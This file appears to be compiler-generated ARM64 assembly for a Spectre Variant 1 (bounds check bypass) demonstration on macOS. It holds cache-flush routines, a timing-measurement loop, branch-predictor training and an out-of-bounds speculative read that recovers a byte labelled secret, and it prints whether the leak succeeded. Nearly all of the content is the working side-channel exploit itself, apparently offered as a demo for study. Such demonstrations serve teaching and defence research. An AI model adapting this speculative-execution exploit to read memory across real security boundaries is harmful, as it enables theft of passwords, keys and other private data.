	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 15, 5
	.globl	_flush_probe_array              ; -- Begin function flush_probe_array
	.p2align	2
_flush_probe_array:                     ; @flush_probe_array
	.cfi_startproc
; %bb.0:
Lloh0:
	adrp	x8, _probe_array@GOTPAGE
Lloh1:
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	mov	w9, #256                        ; =0x100
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	x8, x8, #64
	subs	x9, x9, #1
	b.ne	LBB0_1
; %bb.2:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.loh AdrpLdrGot	Lloh0, Lloh1
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_mfence                     ; -- Begin function _mm_mfence
	.p2align	2
__mm_mfence:                            ; @_mm_mfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_lfence                     ; -- Begin function _mm_lfence
	.p2align	2
__mm_lfence:                            ; @_mm_lfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_clflush                    ; -- Begin function _mm_clflush
	.p2align	2
__mm_clflush:                           ; @_mm_clflush
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dc	civac, x0
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_measure_access_time            ; -- Begin function measure_access_time
	.p2align	2
_measure_access_time:                   ; @measure_access_time
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #80
	stp	x22, x21, [sp, #32]             ; 16-byte Folded Spill
	stp	x20, x19, [sp, #48]             ; 16-byte Folded Spill
	stp	x29, x30, [sp, #64]             ; 16-byte Folded Spill
	add	x29, sp, #64
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w19, -24
	.cfi_offset w20, -32
	.cfi_offset w21, -40
	.cfi_offset w22, -48
	mov	x19, x0
	add	x1, sp, #16
	mov	w0, #6                          ; =0x6
	bl	_clock_gettime
	ldp	x20, x21, [sp, #16]
	ldrb	w8, [x19]
	strb	w8, [sp, #15]
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	add	x1, sp, #16
	mov	w0, #6                          ; =0x6
	bl	_clock_gettime
	ldp	x8, x9, [sp, #16]
	sub	x8, x8, x20
	mov	w10, #51712                     ; =0xca00
	movk	w10, #15258, lsl #16
	sub	x9, x9, x21
	madd	x0, x8, x10, x9
	ldp	x29, x30, [sp, #64]             ; 16-byte Folded Reload
	ldp	x20, x19, [sp, #48]             ; 16-byte Folded Reload
	ldp	x22, x21, [sp, #32]             ; 16-byte Folded Reload
	add	sp, sp, #80
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_benign_target                  ; -- Begin function benign_target
	.p2align	2
_benign_target:                         ; @benign_target
	.cfi_startproc
; %bb.0:
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_common_init                    ; -- Begin function common_init
	.p2align	2
_common_init:                           ; @common_init
	.cfi_startproc
; %bb.0:
	stp	x20, x19, [sp, #-32]!           ; 16-byte Folded Spill
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w19, -24
	.cfi_offset w20, -32
Lloh2:
	adrp	x19, _probe_array@GOTPAGE
Lloh3:
	ldr	x19, [x19, _probe_array@GOTPAGEOFF]
	mov	x0, x19
	mov	w1, #16384                      ; =0x4000
	bl	_bzero
	mov	x8, #0                          ; =0x0
	mov	w9, #1                          ; =0x1
LBB6_1:                                 ; =>This Inner Loop Header: Depth=1
	strb	w9, [x19, x8]
	lsr	x10, x8, #6
	add	x8, x8, #64
	cmp	x10, #255
	b.lo	LBB6_1
; %bb.2:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
Lloh4:
	adrp	x8, _probe_array@GOTPAGE
Lloh5:
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	mov	w9, #256                        ; =0x100
LBB6_3:                                 ; =>This Inner Loop Header: Depth=1
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	x8, x8, #64
	subs	x9, x9, #1
	b.ne	LBB6_3
; %bb.4:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	ldp	x20, x19, [sp], #32             ; 16-byte Folded Reload
	ret
	.loh AdrpLdrGot	Lloh2, Lloh3
	.loh AdrpLdrGot	Lloh4, Lloh5
	.cfi_endproc
                                        ; -- End function
	.globl	_perform_measurement            ; -- Begin function perform_measurement
	.p2align	2
_perform_measurement:                   ; @perform_measurement
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #160
	stp	x28, x27, [sp, #64]             ; 16-byte Folded Spill
	stp	x26, x25, [sp, #80]             ; 16-byte Folded Spill
	stp	x24, x23, [sp, #96]             ; 16-byte Folded Spill
	stp	x22, x21, [sp, #112]            ; 16-byte Folded Spill
	stp	x20, x19, [sp, #128]            ; 16-byte Folded Spill
	stp	x29, x30, [sp, #144]            ; 16-byte Folded Spill
	add	x29, sp, #144
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w19, -24
	.cfi_offset w20, -32
	.cfi_offset w21, -40
	.cfi_offset w22, -48
	.cfi_offset w23, -56
	.cfi_offset w24, -64
	.cfi_offset w25, -72
	.cfi_offset w26, -80
	.cfi_offset w27, -88
	.cfi_offset w28, -96
	mov	x19, x1
	mov	x20, x0
Lloh6:
	adrp	x0, l_str@PAGE
Lloh7:
	add	x0, x0, l_str@PAGEOFF
	bl	_puts
	mov	x23, #0                         ; =0x0
	mov	x22, #-1                        ; =0xffffffffffffffff
	mov	w21, #-1                        ; =0xffffffff
Lloh8:
	adrp	x24, _probe_array@GOTPAGE
Lloh9:
	ldr	x24, [x24, _probe_array@GOTPAGEOFF]
	mov	w25, #51712                     ; =0xca00
	movk	w25, #15258, lsl #16
	b	LBB7_2
LBB7_1:                                 ;   in Loop: Header=BB7_2 Depth=1
	add	x23, x23, #1
	cmp	x23, #256
	b.eq	LBB7_4
LBB7_2:                                 ; =>This Inner Loop Header: Depth=1
	add	x1, sp, #48
	mov	w0, #6                          ; =0x6
	bl	_clock_gettime
	ldp	x26, x27, [sp, #48]
	ldrb	w8, [x24], #64
	strb	w8, [sp, #47]
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	add	x1, sp, #48
	mov	w0, #6                          ; =0x6
	bl	_clock_gettime
	ldp	x8, x9, [sp, #48]
	sub	x8, x8, x26
	sub	x9, x9, x27
	madd	x8, x8, x25, x9
	cmp	x8, #99
	b.gt	LBB7_1
; %bb.3:                                ;   in Loop: Header=BB7_2 Depth=1
	cmn	x22, #1
	ccmp	x8, x22, #8, ne
	cset	w9, lt
	cmp	w9, #0
	csel	w21, w23, w21, ne
	csel	x22, x8, x22, ne
	b	LBB7_1
LBB7_4:
	cmn	w21, #1
	b.eq	LBB7_6
; %bb.5:
	sxtb	w8, w21
	stp	x21, x22, [sp, #16]
	stp	x19, x8, [sp]
Lloh10:
	adrp	x0, l_.str.1@PAGE
Lloh11:
	add	x0, x0, l_.str.1@PAGEOFF
	bl	_printf
	cmp	w21, w20
	cset	w20, eq
Lloh12:
	adrp	x8, l_.str.3@PAGE
Lloh13:
	add	x8, x8, l_.str.3@PAGEOFF
Lloh14:
	adrp	x9, l_.str.2@PAGE
Lloh15:
	add	x9, x9, l_.str.2@PAGEOFF
	csel	x0, x9, x8, eq
	b	LBB7_7
LBB7_6:
	mov	w20, #0                         ; =0x0
Lloh16:
	adrp	x0, l_.str.4@PAGE
Lloh17:
	add	x0, x0, l_.str.4@PAGEOFF
LBB7_7:
	str	x19, [sp]
	bl	_printf
	mov	x0, x20
	ldp	x29, x30, [sp, #144]            ; 16-byte Folded Reload
	ldp	x20, x19, [sp, #128]            ; 16-byte Folded Reload
	ldp	x22, x21, [sp, #112]            ; 16-byte Folded Reload
	ldp	x24, x23, [sp, #96]             ; 16-byte Folded Reload
	ldp	x26, x25, [sp, #80]             ; 16-byte Folded Reload
	ldp	x28, x27, [sp, #64]             ; 16-byte Folded Reload
	add	sp, sp, #160
	ret
	.loh AdrpLdrGot	Lloh8, Lloh9
	.loh AdrpAdd	Lloh6, Lloh7
	.loh AdrpAdd	Lloh14, Lloh15
	.loh AdrpAdd	Lloh12, Lloh13
	.loh AdrpAdd	Lloh10, Lloh11
	.loh AdrpAdd	Lloh16, Lloh17
	.cfi_endproc
                                        ; -- End function
	.globl	_speculative_read_v1            ; -- Begin function speculative_read_v1
	.p2align	2
_speculative_read_v1:                   ; @speculative_read_v1
	.cfi_startproc
; %bb.0:
Lloh18:
	adrp	x8, _g_vulnerable_array_size_v1@PAGE
Lloh19:
	ldr	x8, [x8, _g_vulnerable_array_size_v1@PAGEOFF]
	cmp	x8, x0
	b.ls	LBB8_2
; %bb.1:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
Lloh20:
	adrp	x8, _g_vulnerable_array_v1@PAGE
Lloh21:
	ldr	x8, [x8, _g_vulnerable_array_v1@PAGEOFF]
	ldrb	w8, [x8, x0]
	strb	w8, [sp, #15]
	ldrb	w8, [sp, #15]
	lsl	x8, x8, #6
Lloh22:
	adrp	x9, _probe_array@GOTPAGE
Lloh23:
	ldr	x9, [x9, _probe_array@GOTPAGEOFF]
	mov	w10, #1                         ; =0x1
	strb	w10, [x9, x8]
	add	sp, sp, #16
LBB8_2:
	ret
	.loh AdrpLdr	Lloh18, Lloh19
	.loh AdrpLdrGot	Lloh22, Lloh23
	.loh AdrpLdr	Lloh20, Lloh21
	.cfi_endproc
                                        ; -- End function
	.globl	_main_spectre_v1                ; -- Begin function main_spectre_v1
	.p2align	2
_main_spectre_v1:                       ; @main_spectre_v1
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #48
	stp	x20, x19, [sp, #16]             ; 16-byte Folded Spill
	stp	x29, x30, [sp, #32]             ; 16-byte Folded Spill
	add	x29, sp, #32
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w19, -24
	.cfi_offset w20, -32
Lloh24:
	adrp	x19, _probe_array@GOTPAGE
Lloh25:
	ldr	x19, [x19, _probe_array@GOTPAGEOFF]
	mov	x0, x19
	mov	w1, #16384                      ; =0x4000
	bl	_bzero
	mov	x8, #0                          ; =0x0
	mov	w9, #1                          ; =0x1
LBB9_1:                                 ; =>This Inner Loop Header: Depth=1
	strb	w9, [x19, x8]
	lsr	x10, x8, #6
	add	x8, x8, #64
	cmp	x10, #255
	b.lo	LBB9_1
; %bb.2:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
Lloh26:
	adrp	x8, _probe_array@GOTPAGE
Lloh27:
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	mov	w9, #256                        ; =0x100
LBB9_3:                                 ; =>This Inner Loop Header: Depth=1
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	x8, x8, #64
	subs	x9, x9, #1
	b.ne	LBB9_3
; %bb.4:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
Lloh28:
	adrp	x0, l_str.10@PAGE
Lloh29:
	add	x0, x0, l_str.10@PAGEOFF
	bl	_puts
Lloh30:
	adrp	x0, l_str.11@PAGE
Lloh31:
	add	x0, x0, l_str.11@PAGEOFF
	bl	_puts
	mov	x19, #0                         ; =0x0
	adrp	x20, _g_vulnerable_array_size_v1@PAGE
LBB9_5:                                 ; =>This Inner Loop Header: Depth=1
	ldr	x8, [x20, _g_vulnerable_array_size_v1@PAGEOFF]
	udiv	x9, x19, x8
	msub	x0, x9, x8, x19
	bl	_speculative_read_v1
	add	x19, x19, #1
	cmp	x19, #1000
	b.ne	LBB9_5
; %bb.6:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
Lloh32:
	adrp	x8, _probe_array@GOTPAGE
Lloh33:
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	mov	w9, #256                        ; =0x100
LBB9_7:                                 ; =>This Inner Loop Header: Depth=1
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	x8, x8, #64
	subs	x9, x9, #1
	b.ne	LBB9_7
; %bb.8:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
Lloh34:
	adrp	x8, _g_vulnerable_array_v1@PAGE
Lloh35:
	ldr	x8, [x8, _g_vulnerable_array_v1@PAGEOFF]
Lloh36:
	adrp	x20, _secret_data_v1@PAGE
Lloh37:
	add	x20, x20, _secret_data_v1@PAGEOFF
	sub	x19, x20, x8
	str	x19, [sp]
Lloh38:
	adrp	x0, l_.str.7@PAGE
Lloh39:
	add	x0, x0, l_.str.7@PAGEOFF
	bl	_printf
	mov	x0, x19
	bl	_speculative_read_v1
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ldrb	w0, [x20]
Lloh40:
	adrp	x1, l_.str.8@PAGE
Lloh41:
	add	x1, x1, l_.str.8@PAGEOFF
	bl	_perform_measurement
	ldrb	w8, [x20]
	str	x8, [sp]
Lloh42:
	adrp	x0, l_.str.9@PAGE
Lloh43:
	add	x0, x0, l_.str.9@PAGEOFF
	bl	_printf
	mov	w0, #0                          ; =0x0
	ldp	x29, x30, [sp, #32]             ; 16-byte Folded Reload
	ldp	x20, x19, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #48
	ret
	.loh AdrpLdrGot	Lloh24, Lloh25
	.loh AdrpLdrGot	Lloh26, Lloh27
	.loh AdrpAdd	Lloh30, Lloh31
	.loh AdrpAdd	Lloh28, Lloh29
	.loh AdrpLdrGot	Lloh32, Lloh33
	.loh AdrpAdd	Lloh42, Lloh43
	.loh AdrpAdd	Lloh40, Lloh41
	.loh AdrpAdd	Lloh38, Lloh39
	.loh AdrpAdd	Lloh36, Lloh37
	.loh AdrpLdr	Lloh34, Lloh35
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
	.cfi_startproc
; %bb.0:
	stp	x29, x30, [sp, #-16]!           ; 16-byte Folded Spill
	mov	x29, sp
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	bl	_main_spectre_v1
	mov	w0, #0                          ; =0x0
	ldp	x29, x30, [sp], #16             ; 16-byte Folded Reload
	ret
	.cfi_endproc
                                        ; -- End function
	.comm	_probe_array,16384,0            ; @probe_array
	.section	__TEXT,__cstring,cstring_literals
l_.str.1:                               ; @.str.1
	.asciz	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld ns\n"

l_.str.2:                               ; @.str.2
	.asciz	"SUCCESS! Leaked the actual %s.\n"

l_.str.3:                               ; @.str.3
	.asciz	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"

l_.str.4:                               ; @.str.4
	.asciz	"No %s leaked or could not detect leakage.\n"

	.section	__DATA,__data
	.globl	_public_array                   ; @public_array
_public_array:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"

	.globl	_secret_data_v1                 ; @secret_data_v1
_secret_data_v1:
	.byte	83                              ; 0x53

	.globl	_g_vulnerable_array_v1          ; @g_vulnerable_array_v1
	.p2align	3, 0x0
_g_vulnerable_array_v1:
	.quad	_public_array

	.globl	_g_vulnerable_array_size_v1     ; @g_vulnerable_array_size_v1
	.p2align	3, 0x0
_g_vulnerable_array_size_v1:
	.quad	16                              ; 0x10

	.section	__TEXT,__cstring,cstring_literals
l_.str.7:                               ; @.str.7
	.asciz	"Attempting to leak secret data from OOB index %zu...\n"

l_.str.8:                               ; @.str.8
	.asciz	"Spectre V1 secret"

l_.str.9:                               ; @.str.9
	.asciz	"Actual secret data: %c\n"

l_str:                                  ; @str
	.asciz	"Measuring cache timings..."

l_str.10:                               ; @str.10
	.asciz	"\n--- Running Spectre Variant 1 (Bounds Check Bypass) Demo ---"

l_str.11:                               ; @str.11
	.asciz	"Training branch predictor..."

.subsections_via_symbols
